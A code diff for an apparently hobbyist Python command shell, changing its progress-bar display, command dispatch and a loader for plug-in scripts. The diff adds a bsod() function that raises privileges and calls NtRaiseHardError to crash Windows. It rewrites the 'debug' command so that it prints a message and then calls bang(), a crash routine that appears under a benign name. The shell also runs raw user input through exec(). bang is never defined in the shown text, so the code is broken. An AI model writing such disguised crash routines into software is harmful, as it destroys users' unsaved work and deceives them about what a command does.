@@ -1,9 +1,11 @@
 from colorama import *
 import progressbar
+import pyautogui
+import time as t
 import keyboard
 import platform
 import shutil
-import time as t
+import runpy
 import json
 import sys
 import os
@@ -58,26 +60,26 @@ except (FileNotFoundError, json.JSONDecodeError) as e:
 def load(sleep=0.03):
     left_B = Fore.LIGHTBLUE_EX + "[" + Fore.GREEN
     right_B = Fore.LIGHTBLUE_EX + "]" + Fore.GREEN
-    bar = progressbar.Bar(marker='█',left=f'{left_B}{Fore.YELLOW}║',right=f'║{right_B}')
+    bar = progressbar.Bar(marker='█', left=f'{left_B}{Fore.YELLOW}║', right=f'║{right_B}')
     widgets = [
-        Fore.GREEN, ' ', left_B, 'Downloading', right_B, ' ', left_B, progressbar.Percentage(), Fore.GREEN, right_B,' ', Fore.YELLOW,
+        Fore.GREEN, ' ', left_B, 'Downloading', right_B, ' ', left_B, progressbar.Percentage(), Fore.GREEN, right_B, ' ', Fore.YELLOW,
         bar,
-        ' ', Fore.LIGHTRED_EX, '[',progressbar.AnimatedMarker(), ']', Fore.GREEN,
-        ' ', left_B,'Download size: ', progressbar.DataSize(),
-        right_B,'  ', left_B, progressbar.FileTransferSpeed(),
-        right_B,'  ', left_B, progressbar.Timer(),
-        right_B,'  ', left_B, progressbar.ETA(),right_B
+        ' ', Fore.LIGHTRED_EX, '[', progressbar.AnimatedMarker(), ']', Fore.GREEN,
+        ' ', left_B, 'Download size: ', progressbar.DataSize(),
+        right_B, '  ', left_B, progressbar.FileTransferSpeed(),
+        right_B, '  ', left_B, progressbar.Timer(),
+        right_B, '  ', left_B, progressbar.ETA(), right_B
     ]
     # Define the total number of steps
     total_steps = 100
     # Initialize the ProgressBar object with widgets
-    progress = progressbar.ProgressBar(max_value=total_steps,widgets=widgets).start()
+    progress = progressbar.ProgressBar(max_value=total_steps, widgets=widgets).start()
 
     # Simulate a task by updating the progress bar in a loop
     for i in range(total_steps):
         t.sleep(sleep)
         progress.update(i + 1)
-        print(Fore.GREEN,end="\r")
+        print(Fore.GREEN, end="\r")
 
     # Ensure the progress bar is properly finished
     progress.finish()
@@ -91,7 +93,6 @@ def clear(nom=True):
             print(Jt)
         elif data["title"]["old_title"]:
             print(oldJt)
-
 
 def flush_keyboard():
     print()
@@ -111,6 +112,15 @@ def set_background_color(hex_color):
     escape_code = f"\033[48;2;{r};{g};{b}m"
     # Clear the entire screen and set background
     print(escape_code + ' ' * (shutil.get_terminal_size().columns * shutil.get_terminal_size().lines) + "\033[0m", end='')
+
+def find_files(directory, extension=None):
+    """Find files in a given directory with an optional file extension."""
+    found_files = []
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            if extension is None or file.endswith(extension):
+                found_files.append(os.path.join(root, file))
+    return found_files
 
 def gradient_background(start_hex, end_hex, steps):
     """Create a gradient background from start_hex to end_hex over a specified number of steps."""
@@ -138,7 +148,7 @@ def YesNo(question="", default=1):
     scl_dis = f" {"[yes]" if scl == 1 else " yes "} {"[no]" if scl == 2 else " no "} "
     t.sleep(0.2)
     while True:
-        scl_dis = f"\r {'[yes]' if scl == 1 else ' yes '} {'[no]' if scl == 2 else ' no '}"
+        scl_dis = f"\r {'[yes]' if scl == 1 else ' yes '} {'[no]' if scl == 2 else ' no '} "
         sys.stdout.write(scl_dis)
         sys.stdout.flush()  # Force immediate output
 
@@ -159,67 +169,117 @@ def YesNo(question="", default=1):
     return scl == 1
 
 def JT_setup():
-    title = YesNo(question="use old title?", default=2)
+    title = YesNo(question="Use old title?", default=2)
     if title:
         data["title"]["old_title"] = True
     else:
         data["title"]["new_title"] = True
+
 def JT_restart():
     if YesNo(question="Are you sure?"):
-        data = {
+        return {
             "setup": False,
             "title": {
                 "old_title": False,
                 "new_title": False
             }
         }
-        return data
+
+def file_updated(file_path, last_modified):
+    current_modified = os.path.getmtime(file_path)
+    return current_modified != last_modified
+
+def bsod():
+    from ctypes import windll
+    from ctypes import c_int
+    from ctypes import c_uint
+    from ctypes import c_ulong
+    from ctypes import POINTER
+    from ctypes import byref
+
+    nullptr = POINTER(c_int)()
+
+    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
+
+    windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0),nullptr, nullptr, c_uint(6), byref(c_uint()))
+
+def help():
+    print("Available commands:")
+    for cmd in commands.keys():
+        print(f"- {cmd}")
+    print("- exec")
+    # Find Python files in the 'mods' directory
+    python_files = find_files("mods\\", ".py")
+    if python_files:
+        print("mods command:")
+
+    for file in python_files:
+        # Remove the "mods\\" prefix from each file path for display
+        print(f"- {file.replace('mods\\', '').replace('.py', '')}")
 
 def time():
     print(t.ctime())
 
-commands = ["debug", "resetup", "cls or clear", "exec", "quit", "help", "time"]
+def debug():
+    print("there is NO debug.")
+    t.sleep(1)
+    bang()
+# Define the commands dictionary correctly
+commands = {
+    "debug": debug,
+    "resetup": JT_restart,
+    "help": help,
+    "cls": clear,
+    "clear": clear,
+    "time": time,
+    "bang": bang
+}
+
 bypass = False
+file_path = 'main.py'
+last_modified_time = os.path.getmtime(file_path)
 
 def main():
     global data
     global bypass
-    global commands
+    global last_modified_time 
+    
     if not data["setup"]:
         JT_setup()
         data["setup"] = True
+
     clear()
+    
     while True:
         command = input(Prompt).strip().split(' ')
-        if command[0] == "debug":
-            bypass = True
-            print("there is NO debug.")
-        elif command[0] == "resetup":
-            bypass = True
-            data = JT_restart()
-        elif command[0] == "help":
-            bypass = True
-            print(commands)
-        elif command[0] == "cls" or command[0] == "clear":
-            bypass = True
-            clear()
-        elif command[0] == "exec":
+        if command[0] in ["//", "quit", "exit"]:
+            break
+
+        if command[0] in commands:
+            commands[command[0]]()  # Call the command function directly
+        elif command[0] == "exec" and not command[1]:
+            pass
+        elif command[0] == "exec" and command[1]:
             bypass = True
             try:
-                exec(command[1])
-            except:
-                pass
-        elif not command[0]:
+                exec(command[1])  # Ensure you trust the input
+            except Exception as e:
+                print(f"Error executing command: {e}")
+        elif command[0] == '':
             bypass = True
-            pass
-        elif command[0] == "//" or command[0] == "quit" or command[0] == "exit":
-            break
-        if not bypass:
-            if command[0] in commands:
-                exec(f"{command[0]}()")
-            else:
+        else:
+            try:
+                runpy.run_path(f"mods\\{command[0]}.py")
+            except:
                 print(f"'{command[0]}' is not recognized as an internal or external command.")
-        bypass = False
+
+        # Check if the file has been updated
+        if file_updated(file_path, last_modified_time):
+            print("File updated, re-running...")
+            pyautogui.press("up")
+            pyautogui.press("enter")
+            break
+
 if __name__ == "__main__":
     try:
         clear(nom=False)
@@ -230,4 +290,3 @@ if __name__ == "__main__":
             json.dump(data, file, indent=4)
     except KeyboardInterrupt:
         print("\nProgram terminated.")
-    
